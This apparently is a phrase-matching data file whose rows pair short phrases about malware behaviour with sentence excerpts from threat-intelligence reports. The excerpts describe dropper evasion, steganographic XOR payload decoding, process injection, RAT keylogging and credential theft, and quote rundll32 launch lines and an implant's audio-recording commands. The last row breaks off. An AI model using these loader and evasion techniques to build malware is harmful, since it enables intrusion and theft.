contains several benign files that are written to disk (they are not part of NSIS binaries and they are not used at all by the installer) and two files that are malicious|0.8376913341439229|['In these cases there is no attachment: a link to the GetResponse platform leads to the download of malware.', 'You can see the other emails in the following gallery (click to enlarge): Figures 5 to 13.', 'Various phishing emails and their attached files 4/15Malicious artifacts Droppers The executable files contained in compressed archives that are downloaded via the phishing emails are responsible for decrypting and running remote access trojans on a victimized computer.', 'In the following sections, we describe the various droppers we have seen.', '5/15NSIS installers The dropper that is most commonly used by these attackers comes as a file that was compiled with NSIS (Nullsoft Scriptable Install System).', 'To try to evade detection, this installer contains several benign files that are written to disk (they are not part of NSIS binaries and they are not used at all by the installer) and two files that are malicious: an encrypted RAT executable and a DLL file that decrypts and runs the trojan.', 'An NSIS script for one of these installers is shown in Figure 14.', 'The benign files are usually different in different droppers used by the attackers.', 'Figure 14.', 'NSIS script for one of the droppers; the malicious files are highlighted The files Bonehead (encrypted RAT) and ShoonCataclysm.dll (dropper DLL) are written in the same folder and the DLL is run with rundll32.exe using Uboats as its argument.', 'The names of these files change between executables.']
contains several benign files that are written to disk (they are not part of NSIS binaries and they are not used at all by the installer) and two files that are malicious|0.8376913341439229|[']co(a legitimate site) when visited from outside of Colombia.Also, in some cases theGetResponseservice has been used to send the email.', 'This is probably done to track whether the victim has clicked on the link.', 'In these cases there is no attachment: a link to the GetResponse platform leads to the download of malware.You can see the other emails in the following gallery (click to enlarge):Figures 5 to 13.', 'Various phishing emails and their attached filesMalicious artifactsDroppersThe executable files contained in compressed archives that are downloaded via the phishing emails are responsible for decrypting and running remote access trojans on a victimized computer.', 'In the following sections, we describe the various droppers we have seen.NSIS installersThe dropper that is most commonly used by these attackers comes as a file that was compiled with NSIS (Nullsoft Scriptable Install System).', 'To try to evade detection, this installer contains several benign files that are written to disk (they are not part of NSIS binaries and they are not used at all by the installer) and two files that are malicious: an encrypted RAT executable and a DLL file that decrypts and runs the trojan.', 'An NSIS script for one of these installers is shown in Figure 14.', 'The benign files are usually different in different droppers used by the attackers.Figure 14.', 'NSIS script for one of the droppers; the malicious files are highlightedThe filesBonehead(encrypted RAT) andShoonCataclysm.dll(dropper DLL) are written in the same folder and the DLL is run withrundll32.exeusingUboatsas its argument.', 'The names of these files change between executables.', 'Some more examples are:rundll32.exe Blackface,Breathingrundll32.exe OximeLied,Hostagerundll32.exe Conservatory,PigginsWe used the name of the benign files contained in some of these NSIS installers to find more malicious installers used by the Spalax operators.']
reads data from its own resource section and decrypts a payload.|0.9832384684195284|['Even though there are differences in all the samples regarding the layers of encryption, obfuscation or anti-analysis used, we can summarize the actions taken by the droppers as follows: The dropper reads a string (or binary data) from its resource section and decrypts it.', 'The result is a DLL that will be loaded and called in the same address space.', 'The DLL reads pixels from an image contained in the first binary and decrypts another executable.', 'This one is loaded and executed in the same address space.', 'This new executable is packed with CyaX.', 'It reads data from its own resource section and decrypts a payload.', 'There are anti- analysis checks; if they pass, the payload can be injected into a new process or loaded in the same process space.', 'The initial dropper is coded in C#.', 'In all the samples that we have seen, the code for the dropper was hiding in non-malicious code, probably copied from other apps.', 'The benign code is not executed; its there to evade detection.', '7/15In Figure 16 we see an example of the resources contained in one of these droppers.']
reads data from its own resource section and decrypts a payload.|0.9832384684195284|['These will be described later in thePayloadssection.Agent Tesla packersWe have seen several droppers that are different variants of a packer that uses steganography and is known to be used inAgent Tesla samples.', 'Interestingly, the attackers use various payloads, but none of them are Agent Tesla.', 'Even though there are differences in all the samples regarding the layers of encryption, obfuscation or anti-analysis used, we can summarize the actions taken by the droppers as follows:The dropper reads a string (or binary data) from its resource section and decrypts it.', 'The result is a DLL that will be loaded and called in the same address space.The DLL reads pixels from an image contained in the first binary and decrypts another executable.', 'This one is loaded and executed in the same address space.This new executable is packed with CyaX.', 'It reads data from its own resource section and decrypts a payload.', 'There are anti-analysis checks; if they pass, the payload can be injected into a new process or loaded in the same process space.The initial dropper is coded in C#.', 'In all the samples that we have seen, the code for the dropper was hiding in non-malicious code, probably copied from other apps.', 'The benign code is not executed; its there to evade detection.In Figure 16 we see an example of the resources contained in one of these droppers.', 'The text in green (only shown partially) is a string that will be decrypted to generate the next stage to be executed and the image that we see below the green text will be decrypted by the second stage malware.', 'The algorithm used for decryption of the string varies from sample to sample, but sometimes the resource is just an unencrypted binary.Figure 16.']
is packed with CyaX|0.8822869254544666|['Interestingly, the attackers use various payloads, but none of them are Agent Tesla.', 'Even though there are differences in all the samples regarding the layers of encryption, obfuscation or anti-analysis used, we can summarize the actions taken by the droppers as follows: The dropper reads a string (or binary data) from its resource section and decrypts it.', 'The result is a DLL that will be loaded and called in the same address space.', 'The DLL reads pixels from an image contained in the first binary and decrypts another executable.', 'This one is loaded and executed in the same address space.', 'This new executable is packed with CyaX.', 'It reads data from its own resource section and decrypts a payload.', 'There are anti- analysis checks; if they pass, the payload can be injected into a new process or loaded in the same process space.', 'The initial dropper is coded in C#.', 'In all the samples that we have seen, the code for the dropper was hiding in non-malicious code, probably copied from other apps.', 'The benign code is not executed; its there to evade detection.']
is gzip-decompressed and executed|0.8376732901149861|['The algorithm used for decryption of the string varies from sample to sample, but sometimes the resource is just an unencrypted binary.', 'Figure 16.', 'Resources contained in Agent Teslas packer The method to be executed in the DLL is always named StartGame or StartUpdate.', 'It reads the image from the first executable, and stores every pixel as three numbers according to its red, green and blue components.', 'Then it decrypts the array by doing a single- byte XOR operation, cycling through the key.', 'After that, the array is gzip-decompressed and executed.', 'Part of the code for the mentioned operations is shown in Figure 17.', '8/15Figure 17.', 'Code to decrypt and run the third-stage malware The third stage is in charge of decrypting and running the payload.', 'The .NET packer known as CyaX is used to perform this task.', 'The version of the packer used by the attackers is v4, although they used v2 in some cases.']
is gzip-decompressed and executed|0.8376732901149861|"['The text in green (only shown partially) is a string that will be decrypted to generate the next stage to be executed and the image that we see below the green text will be decrypted by the second stage malware.', 'The algorithm used for decryption of the string varies from sample to sample, but sometimes the resource is just an unencrypted binary.Figure 16.', ""Resources contained in Agent Tesla's packerThe method to be executed in the DLL is always namedStartGameorStartUpdate."", 'It reads the image from the first executable, and stores every pixel as three numbers according to its red, green and blue components.', 'Then it decrypts the array by doing a single-byte XOR operation, cycling through the key.', 'After that, the array is gzip-decompressed and executed.', 'Part of the code for the mentioned operations is shown in Figure 17.Figure 17.', 'Code to decrypt and run the third-stage malwareThe third stage is in charge of decrypting and running the payload.', 'The .NET packer known as CyaX is used to perform this task.', 'The version of the packer used by the attackers is v4, although they used v2 in some cases.', 'Figure 18 shows the hardcoded configuration for one of their samples.Figure 18.']"
.NET packer known as CyaX|0.8425351204491554|['Then it decrypts the array by doing a single- byte XOR operation, cycling through the key.', 'After that, the array is gzip-decompressed and executed.', 'Part of the code for the mentioned operations is shown in Figure 17.', '8/15Figure 17.', 'Code to decrypt and run the third-stage malware The third stage is in charge of decrypting and running the payload.', 'The .NET packer known as CyaX is used to perform this task.', 'The version of the packer used by the attackers is v4, although they used v2 in some cases.', 'Figure 18 shows the hardcoded configuration for one of their samples.', 'Figure 18.', 'Hardcoded configuration in CyaX-Sharp packer The decryption of the payload is based on XOR operations and is the same as the algorithm previously shown but with an extra step: the payload is XORed with its first 16 bytes as a key.', 'Once its decrypted, it can be run in the same address space or injected into a different process, depending on the configuration.']
.NET packer known as CyaX|0.8425351204491554|['It reads the image from the first executable, and stores every pixel as three numbers according to its red, green and blue components.', 'Then it decrypts the array by doing a single-byte XOR operation, cycling through the key.', 'After that, the array is gzip-decompressed and executed.', 'Part of the code for the mentioned operations is shown in Figure 17.Figure 17.', 'Code to decrypt and run the third-stage malwareThe third stage is in charge of decrypting and running the payload.', 'The .NET packer known as CyaX is used to perform this task.', 'The version of the packer used by the attackers is v4, although they used v2 in some cases.', 'Figure 18 shows the hardcoded configuration for one of their samples.Figure 18.', 'Hardcoded configuration in CyaX-Sharp packerThe decryption of the payload is based on XOR operations and is the same as the algorithm previously shown but with an extra step: the payload is XORed with its first 16 bytes as a key.', 'Once its decrypted, it can be run in the same address space or injected into a different process, depending on the configuration.This packer supports various anti-analysis operations such as disabling Windows Defender, checking for security products, and detecting virtual environments and sandboxes.The majority of the payloads for these droppers are njRAT, but we have also seen AsyncRAT.', 'We saw Remcos in one of these droppers, but the code in the packer was different.']
have used various layers of packers for obfuscating their droppers.|0.7660686402573885|['Privilege T1548.002 Abuse Elevation Control The attackers have used RATs that implement UAC bypassing.', 'Escalation Mechanism: Bypass User Access Control Defense T1140 Deobfuscate/Decode Files The attackers have used various encryption algorithms in their Evasion or Information droppers to hide strings and payloads.', 'T1562.001 Impair Defenses: Disable or The attackers have used CyaX packer, which can disable Windows Modify Tools Defender.', 'T1070.004 Indicator Removal on Host: The attackers have used malware that deletes itself from the system.', 'File Deletion T1112 Modify Registry The attackers have used RATs that allow full access to the Registry, for example to clear traces of their activities.', 'T1027.002 Obfuscated Files or The attackers have used various layers of packers for obfuscating Information: Software their droppers.', 'Packing T1027.003 Obfuscated Files or The attackers have used packers that read pixel data from images Information: Steganography contained in PE files resource sections and build the next layer of execution from the data.', 'T1055.002 Process Injection: Portable The attackers have used droppers that inject the payload into Executable Injection legitimate processes such as RegAsm.exe, MSBuild.exe and more.', 'T1497.001 Virtualization/Sandbox The attackers have used droppers and payloads that perform anti- Evasion: System Checks analysis checks to detect virtual environments and analysis tools.', 'Credential T1555.003 Credentials from Password The attackers have used various RATs with modules that steal Access Stores: Credentials from passwords saved in victim web browsers.', 'Web Browsers 14/15Tactic ID Name Description Discovery T1010 Application Window The attackers have used droppers and RATs that gather information Discovery about opened windows.']
decrypting|0.8073402965648736|['Every multiple APT groups operate under, or are resourced by, the ShadowPad sample that we have seen has a root module same digital quartermaster cannot be ruled out for various designed to orchestrate the next set of modules, including a sets of threat actors.', 'In 2021, we continued to observe plugins module that can then be customised depending on this phenomenon, whether through observations of shared the functionality that the threat actor requires.', 'The plugins capability (malware, techniques, exploits, and so on), or can enable capabilities that may include, among others, C2 through overlaps in infrastructure (either through the same communications over HTTP or TCP, keylogging, screenshot patterns observed on C2s, or the reuse of domains/IPs by gathering, port mapping, and system information gathering.6 other threat actors).', 'In tracking standard ShadowPad samples in 2021, Of Shadows and Proxies: China-based threat actors we identified and analysed a new variant, which we sharing tools call ScatterBee: samples of ShadowPad that had been The continued sharing of tools and techniques is a running obfuscated using a custom technique.7 Likely in order to theme among China-based threat actors.', 'While not all of the minimise detection on victim networks, the ScatterBee China-based threat actors share tools with one another, and packing mechanism implements control flow obfuscation, not all of them have access to the same tools, quartermaster string encoding, dynamic API resolutions, several anti- arrangements (covered in more detail in a later section) analysis techniques, as well as shellcode decoding/ continue to complicate attribution of activity.', 'For example, decrypting.', 'We assess that one or more users of ShadowPad the same malware families (such as PlugX, PoisonIvy, have access to ScatterBee, and have highly likely delivered ShadowPad, Quarian, and the Winnti backdoor) are used by some of these malicious payloads via watering hole attacks multiple China-based threat actors, and, as has become very on sites that are used to deliver Adobe Flash update files.', 'We well known in 2021 with the ProxyLogon incidents, some assess that most ScatterBee payloads can be directly linked threat actors share exploits as well.', 'back to the threat actor we track as Red Dev 10 (aka Earth Lusca), and have been used to target organisations in the We note that while not all of these threat actors have been aerospace and defence sectors.', 'observed having access to the shared tools detailed below, these are prime examples of the dynamic We assess ShadowPad to be highly likely used by at least described in this section.', '11 China-based threat actors.8 Our analysis into specific subsets of ShadowPad infrastructure allowed us to identify a wide set of victims, ranging from India-based entities in the telecommunications and oil and gas sectors, to East Asian branches of international humanitarian organisations.7P w PCw CCy Cbyebr eTrh Treharetsa t2s0 22012: 1A: YAe Yaer ainr iRne Rtreotsropsepcetct Figure 1: Geographic distribution of ShadowPad victims observed until December 2021 Source: PwC Exchanging Exchange: ProxyLogon a set of malicious PDF documents targeting the higher In early 2021, Red Dev 13 (aka HAFNIUM) began exploiting education sector.']
decrypt|1.0|"['The execution of StealthMutant through InstallUtil.exe InstallUtil.exe is a legitimate installer application under Microsofts .NET Framework, but it is also known as a living-off-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstallUtil.exe is registered to run StealthMutant, as demonstrated in Figure 11.', 'Figure 11.', 'InstallUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorTechnical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shellcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shellcode loader written in C# that has been in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote process, and then executes it.', 'We have observed that its payload has been either the Cobalt Strike beacon or the ScrambleCross backdoor.', 'Most of the StealthMutant samples we have come across are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework applications.', 'After deobfuscating these samples, we have observed raw namespaces and classes that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and classes from the deobfuscated samples 11 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorAll the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
decrypts the array by doing a single-byte XOR operation, cycling through the key|0.9700523602953721|['The text in green (only shown partially) is a string that will be decrypted to generate the next stage to be executed and the image that we see below the green text will be decrypted by the second stage malware.', 'The algorithm used for decryption of the string varies from sample to sample, but sometimes the resource is just an unencrypted binary.', 'Figure 16.', 'Resources contained in Agent Teslas packer The method to be executed in the DLL is always named StartGame or StartUpdate.', 'It reads the image from the first executable, and stores every pixel as three numbers according to its red, green and blue components.', 'Then it decrypts the array by doing a single- byte XOR operation, cycling through the key.', 'After that, the array is gzip-decompressed and executed.', 'Part of the code for the mentioned operations is shown in Figure 17.', '8/15Figure 17.', 'Code to decrypt and run the third-stage malware The third stage is in charge of decrypting and running the payload.', 'The .NET packer known as CyaX is used to perform this task.']
decrypts the array by doing a single-byte XOR operation, cycling through the key|0.9700523602953721|"['The benign code is not executed; its there to evade detection.In Figure 16 we see an example of the resources contained in one of these droppers.', 'The text in green (only shown partially) is a string that will be decrypted to generate the next stage to be executed and the image that we see below the green text will be decrypted by the second stage malware.', 'The algorithm used for decryption of the string varies from sample to sample, but sometimes the resource is just an unencrypted binary.Figure 16.', ""Resources contained in Agent Tesla's packerThe method to be executed in the DLL is always namedStartGameorStartUpdate."", 'It reads the image from the first executable, and stores every pixel as three numbers according to its red, green and blue components.', 'Then it decrypts the array by doing a single-byte XOR operation, cycling through the key.', 'After that, the array is gzip-decompressed and executed.', 'Part of the code for the mentioned operations is shown in Figure 17.Figure 17.', 'Code to decrypt and run the third-stage malwareThe third stage is in charge of decrypting and running the payload.', 'The .NET packer known as CyaX is used to perform this task.', 'The version of the packer used by the attackers is v4, although they used v2 in some cases.']"
encrypted resource and XORed with a hardcoded password|0.8495077954635564|['We saw Remcos in one of these droppers, but the code in the packer was different.', 'Part of the main routine for the injection of the payload is shown in Figure 19.', 'Figure 19.', 'Code for the last stage of a dropper We have noticed that the configuration is contained in different variables.', 'Values like #startup_method# or #bind# mean that the configuration was not set for those options.', 'The payload is read from an encrypted resource and XORed with a hardcoded password.', 'The shellcode that performs the injection is contained in an array and is dynamically loaded.', 'There are no anti-analysis checks or protection mechanisms.', 'AutoIt droppers For some of their droppers, the attackers have used an AutoIt packer that comes heavily obfuscated.', 'Unlike the cases that were previously described, in this case the first-stage malware performs the injection and execution of the payload.', 'It does so by using two shellcodes contained in the compiled AutoIt script: one to decrypt the payload and another to inject it into some process.']
encrypted resource and XORed with a hardcoded password|0.8495077954635564|['Once its decrypted, it can be run in the same address space or injected into a different process, depending on the configuration.This packer supports various anti-analysis operations such as disabling Windows Defender, checking for security products, and detecting virtual environments and sandboxes.The majority of the payloads for these droppers are njRAT, but we have also seen AsyncRAT.', 'We saw Remcos in one of these droppers, but the code in the packer was different.', 'Part of the main routine for the injection of the payload is shown in Figure 19.Figure 19.', 'Code for the last stage of a dropperWe have noticed that the configuration is contained in different variables.', 'Values like#startup_method#or#bind#mean that the configuration was not set for those options.', 'The payload is read from an encrypted resource and XORed with a hardcoded password.', 'The shellcode that performs the injection is contained in an array and is dynamically loaded.', 'There are no anti-analysis checks or protection mechanisms.AutoIt droppersFor some of their droppers, the attackers have used an AutoIt packer that comes heavily obfuscated.', 'Unlike the cases that were previously described, in this case the first-stage malware performs the injection and execution of the payload.', 'It does so by using two shellcodes contained in the compiled AutoIt script: one to decrypt the payload and another to inject it into some process.The payload is constructed by concatenating several strings, as shown in Figure 20.', 'By inspecting the last two characters, we can see that the string is in reverse order.Figure 20.']
reads pixels from an image contained in the first binary|0.8340299798337544|['These will be described later in the Payloads section.', 'Agent Tesla packers We have seen several droppers that are different variants of a packer that uses steganography and is known to be used in Agent Tesla samples.', 'Interestingly, the attackers use various payloads, but none of them are Agent Tesla.', 'Even though there are differences in all the samples regarding the layers of encryption, obfuscation or anti-analysis used, we can summarize the actions taken by the droppers as follows: The dropper reads a string (or binary data) from its resource section and decrypts it.', 'The result is a DLL that will be loaded and called in the same address space.', 'The DLL reads pixels from an image contained in the first binary and decrypts another executable.', 'This one is loaded and executed in the same address space.', 'This new executable is packed with CyaX.', 'It reads data from its own resource section and decrypts a payload.', 'There are anti- analysis checks; if they pass, the payload can be injected into a new process or loaded in the same process space.', 'The initial dropper is coded in C#.']
stores every pixel as three numbers according to its red, green and blue components|0.863254101625087|['7/15In Figure 16 we see an example of the resources contained in one of these droppers.', 'The text in green (only shown partially) is a string that will be decrypted to generate the next stage to be executed and the image that we see below the green text will be decrypted by the second stage malware.', 'The algorithm used for decryption of the string varies from sample to sample, but sometimes the resource is just an unencrypted binary.', 'Figure 16.', 'Resources contained in Agent Teslas packer The method to be executed in the DLL is always named StartGame or StartUpdate.', 'It reads the image from the first executable, and stores every pixel as three numbers according to its red, green and blue components.', 'Then it decrypts the array by doing a single- byte XOR operation, cycling through the key.', 'After that, the array is gzip-decompressed and executed.', 'Part of the code for the mentioned operations is shown in Figure 17.', '8/15Figure 17.', 'Code to decrypt and run the third-stage malware The third stage is in charge of decrypting and running the payload.']
stores every pixel as three numbers according to its red, green and blue components|0.863254101625087|"['In all the samples that we have seen, the code for the dropper was hiding in non-malicious code, probably copied from other apps.', 'The benign code is not executed; its there to evade detection.In Figure 16 we see an example of the resources contained in one of these droppers.', 'The text in green (only shown partially) is a string that will be decrypted to generate the next stage to be executed and the image that we see below the green text will be decrypted by the second stage malware.', 'The algorithm used for decryption of the string varies from sample to sample, but sometimes the resource is just an unencrypted binary.Figure 16.', ""Resources contained in Agent Tesla's packerThe method to be executed in the DLL is always namedStartGameorStartUpdate."", 'It reads the image from the first executable, and stores every pixel as three numbers according to its red, green and blue components.', 'Then it decrypts the array by doing a single-byte XOR operation, cycling through the key.', 'After that, the array is gzip-decompressed and executed.', 'Part of the code for the mentioned operations is shown in Figure 17.Figure 17.', 'Code to decrypt and run the third-stage malwareThe third stage is in charge of decrypting and running the payload.', 'The .NET packer known as CyaX is used to perform this task.']"
have used packers that read pixel data from images contained in PE files’ resource sections and build the next layer of execution from the data|0.8170479237545244|['Escalation Mechanism: Bypass User Access Control Defense T1140 Deobfuscate/Decode Files The attackers have used various encryption algorithms in their Evasion or Information droppers to hide strings and payloads.', 'T1562.001 Impair Defenses: Disable or The attackers have used CyaX packer, which can disable Windows Modify Tools Defender.', 'T1070.004 Indicator Removal on Host: The attackers have used malware that deletes itself from the system.', 'File Deletion T1112 Modify Registry The attackers have used RATs that allow full access to the Registry, for example to clear traces of their activities.', 'T1027.002 Obfuscated Files or The attackers have used various layers of packers for obfuscating Information: Software their droppers.', 'Packing T1027.003 Obfuscated Files or The attackers have used packers that read pixel data from images Information: Steganography contained in PE files resource sections and build the next layer of execution from the data.', 'T1055.002 Process Injection: Portable The attackers have used droppers that inject the payload into Executable Injection legitimate processes such as RegAsm.exe, MSBuild.exe and more.', 'T1497.001 Virtualization/Sandbox The attackers have used droppers and payloads that perform anti- Evasion: System Checks analysis checks to detect virtual environments and analysis tools.', 'Credential T1555.003 Credentials from Password The attackers have used various RATs with modules that steal Access Stores: Credentials from passwords saved in victim web browsers.', 'Web Browsers 14/15Tactic ID Name Description Discovery T1010 Application Window The attackers have used droppers and RATs that gather information Discovery about opened windows.', 'T1083 File and Directory Discovery The attackers have used various RATs that can browse file systems.']
DLL that will be loaded and called in the same address space|0.9125679943516946|['In the vast majority of cases these NSIS droppers decrypt and run the Remcos RAT, but we have also seen cases where the payload is njRAT.', 'These will be described later in the Payloads section.', 'Agent Tesla packers We have seen several droppers that are different variants of a packer that uses steganography and is known to be used in Agent Tesla samples.', 'Interestingly, the attackers use various payloads, but none of them are Agent Tesla.', 'Even though there are differences in all the samples regarding the layers of encryption, obfuscation or anti-analysis used, we can summarize the actions taken by the droppers as follows: The dropper reads a string (or binary data) from its resource section and decrypts it.', 'The result is a DLL that will be loaded and called in the same address space.', 'The DLL reads pixels from an image contained in the first binary and decrypts another executable.', 'This one is loaded and executed in the same address space.', 'This new executable is packed with CyaX.', 'It reads data from its own resource section and decrypts a payload.', 'There are anti- analysis checks; if they pass, the payload can be injected into a new process or loaded in the same process space.']
performs the injection is contained in an array and is dynamically loaded.|0.9386212136193097|['Part of the main routine for the injection of the payload is shown in Figure 19.', 'Figure 19.', 'Code for the last stage of a dropper We have noticed that the configuration is contained in different variables.', 'Values like #startup_method# or #bind# mean that the configuration was not set for those options.', 'The payload is read from an encrypted resource and XORed with a hardcoded password.', 'The shellcode that performs the injection is contained in an array and is dynamically loaded.', 'There are no anti-analysis checks or protection mechanisms.', 'AutoIt droppers For some of their droppers, the attackers have used an AutoIt packer that comes heavily obfuscated.', 'Unlike the cases that were previously described, in this case the first-stage malware performs the injection and execution of the payload.', 'It does so by using two shellcodes contained in the compiled AutoIt script: one to decrypt the payload and another to inject it into some process.', 'The payload is constructed by concatenating several strings, as shown in Figure 20.']
performs the injection is contained in an array and is dynamically loaded.|0.9386212136193097|['We saw Remcos in one of these droppers, but the code in the packer was different.', 'Part of the main routine for the injection of the payload is shown in Figure 19.Figure 19.', 'Code for the last stage of a dropperWe have noticed that the configuration is contained in different variables.', 'Values like#startup_method#or#bind#mean that the configuration was not set for those options.', 'The payload is read from an encrypted resource and XORed with a hardcoded password.', 'The shellcode that performs the injection is contained in an array and is dynamically loaded.', 'There are no anti-analysis checks or protection mechanisms.AutoIt droppersFor some of their droppers, the attackers have used an AutoIt packer that comes heavily obfuscated.', 'Unlike the cases that were previously described, in this case the first-stage malware performs the injection and execution of the payload.', 'It does so by using two shellcodes contained in the compiled AutoIt script: one to decrypt the payload and another to inject it into some process.The payload is constructed by concatenating several strings, as shown in Figure 20.', 'By inspecting the last two characters, we can see that the string is in reverse order.Figure 20.', 'Concatenation of the payloadThe routine that decrypts the payload contains a small shellcode that is loaded withVirtualAllocand executed.']
used API calls in their droppers, such as CreateProcessA, WriteProcessMemory and ResumeThread, to load and execute shellcode in memory|0.8543564119501068|['MITRE ATT&CK techniques Note: This table was built using version 7 of the MITRE ATT&CK framework.', 'Tactic ID Name Description Initial T1566.001 Phishing: Spearphishing The attackers have used emails with PDF or RTF files attached that Access Attachment contain a link to download malware.', 'T1566.002 Phishing: Spearphishing The attackers have used emails with a link to download malware.', 'Link Execution T1059.005 Command and Scripting The attackers have used droppers that dump VBS files with Interpreter: Visual Basic commands to achieve persistence.', 'T1059.003 Command and Scripting The attackers have used RATs that can launch a command shell for Interpreter: Windows executing commands.', 'Command Shell T1106 Native API The attackers have used API calls in their droppers, such as CreateProcessA, WriteProcessMemory and ResumeThread, to load and execute shellcode in memory.', 'T1204.001 User Execution: Malicious The attackers have attempted to get users to open a malicious link Link that leads to the download of malware.', 'T1204.002 User Execution: Malicious The attackers have attempted to get users to execute malicious files File masquerading as documents.', 'Persistence T1547.001 Boot or Logon Initialization The attackers have used RATs that persist by creating a Run registry Scripts: Registry Run Keys / key or by creating a copy of the malware in the Startup folder.', 'Startup Folder T1053.005 Scheduled Task/Job: The attackers have used scheduled tasks in their droppers and Scheduled Task payloads to achieve persistence.', 'Privilege T1548.002 Abuse Elevation Control The attackers have used RATs that implement UAC bypassing.']
used RATs that persist by creating a Run registry key or by creating a copy of the malware in the Startup folder|0.7723203792066763|[]
Download and execute files|0.7696753830793681|['After it is installed and started, the JPIN service can perform the following tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on.', 'List running services, processes, job IDs, and task IDs.', 'Enumerate drives and their types.', 'Enumerate registry keys.', 'Load a custom keylogger.', 'Download files.', 'Download and upgrade itself.', 'Acquire network information such as DNS, IP, proxies, and so on.', 'Exfiltrate information over HTTP GET and POST requests, with the data stored either within the HTTP body or within the URL parameters.', 'Lower security settings by tampering with registry keys.', 'Inject content into the lsass.exe process, in order to load the keylogger module into lsass and call its exported function.']
keylogging,|0.8650775050655931|"['Require encryption for employees, especially employees working remotely.', 'This includes whole-disc, such as 256- bit AES, and network encryption via SSL or TLS.', 'For enterprises, Recorded Future can monitor for potential typosquat domains weaponized in phishing attacks.', 'This includes not only the domains belonging to one organization, but third-party partners and vendors with enterprise network access.', 'www.recordedfuture.com | Recorded Future CTA-2022-0802 6CYBER THREAT ANALYSIS The Recorded Future Platform can also assist with Through the use of process monitoring, monitor for the the detection of compromised credential information execution and command of binaries involved in data linked to valid accounts to assist in providing context destruction activity, such as vssadmin, wbadmin, and surrounding suspicious user behavior that may include bcdedit.', 'keylogging activity.', 'Recorded Future Platform users can Monitor for the creation of suspicious file modification continue to monitor underground sources to identify the activity, particularly large quantities of file modifications spyware and keylogging tools that are likely to be the in user directories.', 'most harmful to their immediate infrastructure or supply Consider keeping sensitive client information on systems chain.', 'disconnected from the internet or segmented from the rest of the corporate network.', 'Since ransomware will Ransomware encrypt all files on a victim system and often will search Maintain offline backups of your organizations data and for directories on the network (such as networked file ensure that these backups stay up to date to prevent data loss shares) to also encrypt, moving highly sensitive customer in the event of a ransomware infection.', 'Additionally, Recorded data to a system with no internet access or access to the Future recommends the following mitigations to reduce overall rest of the network will minimize the access ransomware risk: would have to those files.']"
keylogging,|1.0|"['This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management.', 'Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".']"
used various RATs that have keylogging capabilities|0.7509909353487987|['T1021.001 Remote Services: Remote The attackers have used various RATs that can perform remote Desktop Protocol desktop access.', 'T1091 Replication Through The attackers have used njRAT, which can be configured to spread Removable Media via removable drives.', 'Collection T1123 Audio Capture The attackers have used various RATs that can capture audio from the systems microphone.', 'T1115 Clipboard Data The attackers have used various RATs that can access and modify data from the clipboard.', 'T1005 Data from Local System The attackers have used various RATs that can access the local file system and upload, download or delete files.', 'T1056.001 Input Capture: Keylogging The attackers have used various RATs that have keylogging capabilities.', 'T1113 Screen Capture The attackers have used various RATs that can capture screenshots of victim machines.', 'T1125 Video Capture The attackers have used various RATs that can access the victims webcam.', 'Command T1132.001 Data Encoding: Standard The attackers have used njRAT, which uses base64 encoding for and Control Encoding C&C traffic.', 'T1573.001 Encrypted Channel: The attackers have used Remcos RAT, which uses RC4 for Symmetric Cryptography encrypting C&C communications.', 'T1095 Non-Application Layer The attackers have used various RATs that use TCP for C&C Protocol communications.']
screen capture|0.7874139748068278|"['For example, MicRecord runs in the context of the malware itself and not as an external plugin.', 'The recording is performed using the mciSendStringA API and the following command lines: Plain text Copy to clipboard Open code in new window EnlighterJS 3 Syntax Highlighter open new type waveaudio alias Record1 set Record1 time format ms set Record1 bitspersample 16 set Record1 samplespersec 16000 set Record1 bytespersec 8000 set Record1 channels 2 record Record1 notify stop Record1 save Record1 ""C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\1.wav"" close Record1 open new type waveaudio alias Record1 set Record1 time format ms set Record1 bitspersample 16 set Record1 samplespersec 16000 set Record1 bytespersec 8000 set Record1 channels 2 record Record1 notify stop Record1 save Record1 ""C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\1.wav"" close Record1 open new type waveaudio alias Record1 set Record1 time format ms set Record1 bitspersample 16 set Record1 samplespersec 16000 set Record1 bytespersec 8000 set Record1 channels 2 record Record1 notify stop Record1 save Record1 ""C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\1.wav"" close Record1 Below is the full list of supported Stealth Soldier commands: Implant Command Arguments Description Implant possible error possible error Error occured in getting Folder Directory Sends all directory Directory List of is: + Contents + DirectoryList name content filenames Managed to Count %d Files Before Error Uploads the file to the File content + File File Failed to UploadFile filename C&C Uploaded Successfully be uploaded ScreenShot Taken Error Occured Successfully + Image to Runs sc.exe and sends in Creating Screenshot be uploaded = 1.png + to C&C ScreenShot ScreenShot Taken & Process Uploaded Successfully C:\\\\Users\\\\Public\\\\1.wav + Records the victims Failed to content + Recording MicRecord sleep time computer and sends it to Upload Saved & Uploaded C&C Recording File Successfully Error Occured Runs plugin kl.exe KeyLogger Task Started in Creating Keylogger (downloads it from C&C) Successfully KeyLogger Process 4/11Implant Command Arguments Description Implant possible error possible error Error Occured Runs BrCr.exe module BrowserCreds Task in Creating BrowserCreds (downloads it from C&C) Started Successfully BrowserCreds Process Command : : Runs 